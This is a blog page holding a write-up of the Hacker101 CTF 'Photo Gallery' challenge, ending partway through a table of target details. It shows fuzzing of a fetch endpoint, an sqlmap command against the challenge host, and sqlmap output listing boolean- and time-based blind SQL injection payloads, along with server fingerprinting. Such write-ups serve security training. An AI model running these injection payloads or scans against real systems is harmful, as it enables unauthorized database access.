<!DOCTYPE html><html><head><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="preconnect" href="https://fonts.gstatic.com" class="jsx-37717e9a7cbc0337"/><link href="https://fonts.gstatic.com/s/firacode/v10/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff" rel="preload" crossorigin="crossorigin" type="font/woff2" as="font" class="jsx-37717e9a7cbc0337"/><link rel="stylesheet" class="jsx-37717e9a7cbc0337" data-href="https://fonts.googleapis.com/css2?family=Fira+Code&amp;display=swap" data-optimized-fonts="true"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TZ2VB384DV" class="jsx-37717e9a7cbc0337"></script><script class="jsx-37717e9a7cbc0337">
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());

            gtag('config', 'G-TZ2VB384DV');
            </script><title>Hacker101 CTF Photo Gallery [moderate] writeupa write up for this web challenge</title><meta name="copyright" content="lwlx. 2021"/><link rel="canonical" href="https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"/><meta name="description" content="A write up for the Photo Gallery [moderae] challenge"/><meta property="og:type" content="website"/><meta name="og:title" property="og:title" content="Hacker101 CTF Photo Gallery [moderate] writeupa write up for this web challenge"/><meta name="og:description" property="og:description" content="A write up for the Photo Gallery [moderae] challenge"/><meta property="og:site_name" content="dev.lwlx.xyz"/><meta property="og:url" content="https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Hacker101 CTF Photo Gallery [moderate] writeupa write up for this web challenge"/><meta name="twitter:description" content="A write up for the Photo Gallery [moderae] challenge"/><meta name="twitter:site" content="@0x0000005"/><meta name="twitter:creator" content="@0x0000005"/><meta name="twitter:image" content="https://dev.lwlx.xyz/hackerone/hackerone"/><meta property="og:image" content="https://dev.lwlx.xyz/hackerone/hackerone"/><meta name="next-head-count" content="24"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-ffff7cc2ca7bd393.js" defer=""></script><script src="/_next/static/chunks/framework-4975f770e34de116.js" defer=""></script><script src="/_next/static/chunks/main-22bd8129361cadd1.js" defer=""></script><script src="/_next/static/chunks/pages/_app-e428d0ff4dd862ba.js" defer=""></script><script src="/_next/static/chunks/286-52bf752def536adc.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bblog%5D-f33cd47b729aa1bd.js" defer=""></script><script src="/_next/static/T2-MsiL6Y5nWCuVdpJEy7/_buildManifest.js" defer=""></script><script src="/_next/static/T2-MsiL6Y5nWCuVdpJEy7/_ssgManifest.js" defer=""></script><script src="/_next/static/T2-MsiL6Y5nWCuVdpJEy7/_middlewareManifest.js" defer=""></script><style id="__jsx-62f0b32f662fb62a">.blog-post{width:100%;
max-width:1080px}</style><style id="__jsx-960443092">.lwlx-markdown p, .lwlx-markdown li{line-height:32px;
font-size:21px;
color:#ccc;
overflow-wrap:break-word}
.lwlx-markdown h1, .lwlx-markdown h2, .lwlx-markdown h3, .lwlx-markdown h4, .lwlx-markdown h5, .lwlx-markdown h6{margin:0px;
padding:0px}
.lwlx-markdown h1>a, .lwlx-markdown h2>a, .lwlx-markdown h3>a, .lwlx-markdown h4>a, .lwlx-markdown h5>a, .lwlx-markdown h6>a{text-decoration:underline;
color:#f07693}
.lwlx-markdown hr{margin:20px 0px;
opacity:0.35}
.lwlx-markdown h1{font-size:1.5em;
line-height:56px;
padding-top:30px;
padding-bottom:10px;
margin-top:30px;
margin-bottom:30px}
.lwlx-markdown h2{font-size:1.3em;
padding-top:25px;
padding-bottom:10px;
margin-top:25px;
margin-bottom:25px}
.lwlx-markdown h3{font-size:1.2em;
padding-top:20px;
padding-bottom:10px;
margin-top:20px;
margin-bottom:20px}
.lwlx-markdown h4{font-size:1em;
padding-top:15px;
padding-bottom:10px;
margin-top:15px;
margin-bottom:15px}
.lwlx-markdown h5{padding-top:10px;
padding-bottom:10px;
margin-top:10px;
margin-bottom:10px}
.lwlx-markdown h6{padding-top:5px;
padding-bottom:10px;
margin-top:5px;
margin-bottom:5px}
.lwlx-markdown p{padding:10px 0px;
margin:10px 0px}
.lwlx-markdown li{padding:10px 0px}
.lwlx-markdown img{width:100%;
border-radius:8px;
box-shadow:0px 4px 30px #00000040}
.lwlx-markdown code{font-family:'Fira Code', monospace;
background-color:#f07693f0;
color:#222;
padding:2px 2px;
border-radius:2px;
font-size:13px}
.lwlx-markdown pre{margin:12px 0px!important}
.lwlx-markdown ol pre, .lwlx-markdown ol p{margin:0px 0px!important}
.lwlx-markdown blockquote{margin:0px;
padding-left:1em;
border-left:4px solid #F07693}
.lwlx-markdown table{padding:4px;
background:rgba(0, 0, 0, 0.02)}
.lwlx-markdown table code{background-color:#f07693f0;
color:#222;
padding:2px 2px;
border-radius:4px;
font-size:1em;
line-height:1.8em}
.lwlx-markdown tbody td{padding:12px;
border-top:solid 1px #00000020}
.lwlx-markdown thead td{padding:8px;
background:#f07693;
font-size:16px}
a{text-decoration:underline;
color:#f07693}
@media only screen and (min-width:768px) {.lwlx-markdown code{background-color:#f07693f0;
color:#222;
padding:3px 3px;
border-radius:2px;
font-size:16px}
.lwlx-markdown h1{font-size:46px;
line-height:56px;
padding-top:30px;
padding-bottom:10px;
margin-top:30px;
margin-bottom:30px}
.lwlx-markdown h2{padding-top:25px;
padding-bottom:10px;
margin-top:25px;
margin-bottom:25px}
.lwlx-markdown h3{padding-top:20px;
padding-bottom:10px;
margin-top:20px;
margin-bottom:20px}
.lwlx-markdown h4{padding-top:15px;
padding-bottom:10px;
margin-top:15px;
margin-bottom:15px}
.lwlx-markdown h5{padding-top:10px;
padding-bottom:10px;
margin-top:10px;
margin-bottom:10px}
.lwlx-markdown h6{padding-top:5px;
padding-bottom:10px;
margin-top:5px;
margin-bottom:5px}
.lwlx-markdown p{padding:10px 0px;
margin:10px 0px}}</style><style id="__jsx-37717e9a7cbc0337">html, body, #__next{min-height:100%;
font-family:Fira Code, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif}
*{box-sizing:border-box}</style><style data-href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap">@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sFVQ.woff) format('woff')}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV37MOzlojwUKaJO.woff) format('woff');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVT7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVz7MOzlojwUKaJO.woff) format('woff');unicode-range:U+1F00-1FFF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVP7MOzlojwUKaJO.woff) format('woff');unicode-range:U+0370-03FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJV77MOzlojwUKaJO.woff) format('woff');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Fira Code';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/firacode/v14/uU9eCBsR6Z2vfE9aq3bL0fxyUs4tcw4W_D1sJVD7MOzlojwUKQ.woff) format('woff');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 1bd2rq4">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:#fff;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#121212;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#121212;}</style><style data-emotion="css 1ourwbl">.css-1ourwbl{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;min-height:100vh;}</style><div class="MuiBox-root css-1ourwbl"><div style="top:0;width:90%;border-radius:12px;margin-top:14px;margin-bottom:12px;height:48px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;padding:24px;font-size:12pt;font-family:Fira Code;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 11px  rgba(58,58,58, 0.5)"><a href="/" style="text-decoration:none"><p style="color:#F07693">dev.lwlx.xyz</p></a><div style="flex:1"></div><a href="https://github.com/Lawlez/myOSWE" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true" style="margin-right:-12px"><path fill="#F07693" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg><p style="padding:0px 1em;color:#F07693">GitHub</p></a><a href="https://twitter.com/0x0000005" style="text-decoration:none;display:flex;align-items:center"><svg height="16" viewBox="0 0 24 24" style="margin-right:-12px"><g><path fill="#F07693" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg><p style="padding:0px 1em;color:#F07693">Twitter</p></a></div><style data-emotion="css 5csqms">.css-5csqms{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;}@media (min-width:1200px){.css-5csqms{max-width:1200px;}}</style><div class="MuiContainer-root MuiContainer-maxWidthLg MuiContainer-disableGutters css-5csqms"><div style="display:flex;flex-direction:row;justify-content:center;width:100%;padding:0px 0px 100px 0px" class="jsx-62f0b32f662fb62a"><div class="jsx-62f0b32f662fb62a blog-post"><picture><source srcSet="/hackerone/hackerone.webp" type="image/webp" style="width:100%;max-width:100%;margin:0px;max-height:490px"/><img src="/hackerone/hackerone.jpg" style="width:100%;max-width:100%;margin:0px;max-height:490px"/></picture><div style="padding:32px 2vw 8px 2vw" class="jsx-62f0b32f662fb62a"><h1 style="margin:8px 0px 8px 0px;padding:0;border:none;font-size:2.6em;font-family:Fira Code" class="jsx-62f0b32f662fb62a">Hacker101 CTF Photo Gallery [moderate] writeup</h1><h2 style="margin:8px 0px;padding:0;border:none;font-weight:400;opacity:0.6;font-family:Fira Code" class="jsx-62f0b32f662fb62a">a write up for this web challenge</h2><hr style="height:2px;background:#1177AB;margin:24px 0px;border:none;border-radius:1px" class="jsx-62f0b32f662fb62a"/><div style="font-family:Fira Code;margin:0px;padding:0px"><div style="display:flex;flex-direction:row;align-items:center;justify-content:flex-start"><picture><source srcSet="/profile.webp" type="image/webp" style="background:#141414;box-shadow:6px 6px 8px rgb(4,4,4,0.6), -6px -6px 8px  rgba(58,58,58, 0.5);width:64px;height:64px;border-radius:34px;margin:0px 8px 0px 0px"/><img src="/profile.jpg" style="background:#141414;box-shadow:6px 6px 8px rgb(4,4,4,0.6), -6px -6px 8px  rgba(58,58,58, 0.5);width:64px;height:64px;border-radius:34px;margin:0px 8px 0px 0px"/></picture><div><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt">lwlx</p><p style="opacity:0.6;margin:2px;padding:0;line-height:1.2;font-size:11pt">03. January 2021</p><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt"><a style="text-decoration:none;color:#1177AB" href="https://twitter.com/0x0000005">@0x0000005</a></p></div></div></div></div><div style="width:100%;padding:0px 2vw" class="jsx-62f0b32f662fb62a"><div style="width:100%" class="jsx-960443092 lwlx-markdown"><p>This is my Write Up for the &quot;Photo Gallery&quot; challenge of HackerOne&#x27;s CTF.</p><p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
The missing one is called <code>Invisible</code>, so lets look into that.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>http</span><span class="token token" style="color:#c9c0be;background:#000000">:</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">34.74</span><span class="token token" style="color:#4499ee">.105</span><span class="token token" style="color:#4499ee">.127</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span></span></code></pre><p><img src="/hackerone/photogallery-start.png" alt="initial page" title="initial page"/></p><h2>Information gathering</h2><p>with Burp we were able to find that the server returns no content for this image.
images are loaded with a <code>GET</code> Request to the server like so:</p><p><code>GET /ad3e8c7df9/fetch?id=1 HTTP/1.1</code></p><p>this also aligns with the first tip we are provided:</p><blockquote><p>Hint 1: <em>Consider how you might build this system yourself. What would the <strong>query for fetch</strong> look like?</em></p></blockquote><p>naturally we start fuzzing the <code>id</code> parameter.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">4</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 404</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 404</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#4499ee">1</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 500</span></span></code></pre><p>alright, no quick wins, so let&#x27;s give it a try with fizzing using sqlmap.
Quickly we are able to see that the server seems to be vulnerable to some attack.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=2&quot;</span></span></code></pre><p>This command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.
when we are done we should know what to do next.</p><h2>Gathered Data</h2><h3>sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>Parameter</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span> </span><span class="token token" style="color:#999999">(</span><span>GET</span><span class="token token" style="color:#999999">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>Type</span><span class="token token" style="color:#999999">:</span><span> boolean</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>Title</span><span class="token token" style="color:#999999">:</span><span> AND boolean</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span> WHERE </span><span class="token token" style="color:#1177ab">or</span><span> HAVING clause
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span>Payload</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">2</span><span> AND </span><span class="token token" style="color:#4499ee">3567</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">3567</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span>Type</span><span class="token token" style="color:#999999">:</span><span> time</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span>Title</span><span class="token token" style="color:#999999">:</span><span> MySQL </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> AND time</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind </span><span class="token token" style="color:#999999">(</span><span>query SLEEP</span><span class="token token" style="color:#999999">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span>Payload</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">2</span><span> AND </span><span class="token token" style="color:#999999">(</span><span>SELECT </span><span class="token token" style="color:#4499ee">8480</span><span> FROM </span><span class="token token" style="color:#999999">(</span><span>SELECT</span><span class="token token" style="color:#999999">(</span><span>SLEEP</span><span class="token token" style="color:#999999">(</span><span class="token token" style="color:#4499ee">5</span><span class="token token" style="color:#999999">)</span><span class="token token" style="color:#999999">)</span><span class="token token" style="color:#999999">)</span><span>KHRS</span><span class="token token" style="color:#999999">)</span></span></code></pre><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#999999">[</span><span class="token token" style="color:#4499ee">21</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#4499ee">44</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#4499ee">44</span><span class="token token" style="color:#999999">]</span><span> </span><span class="token token" style="color:#999999">[</span><span>INFO</span><span class="token token" style="color:#999999">]</span><span> the back</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>end DBMS </span><span class="token token" style="color:#1177ab">is</span><span> MySQL
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>web server operating system</span><span class="token token" style="color:#999999">:</span><span> Linux Ubuntu
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>web application technology</span><span class="token token" style="color:#999999">:</span><span> Nginx </span><span class="token token" style="color:#4499ee">1.14</span><span class="token token" style="color:#4499ee">.0</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span>back</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>end DBMS</span><span class="token token" style="color:#999999">:</span><span> MySQL </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> </span><span class="token token" style="color:#999999">(</span><span>MariaDB fork</span><span class="token token" style="color:#999999">)</span></span></code></pre><h3>Our Target Server:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Type</span><span>      </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Service</span><span>      </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Version</span><span>                  </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Vulnerable</span><span class="token token" style="color:#c9c0be;background:#000000">?</span><span>    </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#4499ee">OS</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Linux</span><span> </span><span class="token token maybe-class-name">Ubuntu</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">??</span><span>                       </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> not focused    </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Webserver</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Nginx</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#4499ee">1.14</span><span class="token token" style="color:#4499ee">.0</span><span>                   </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> no             </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
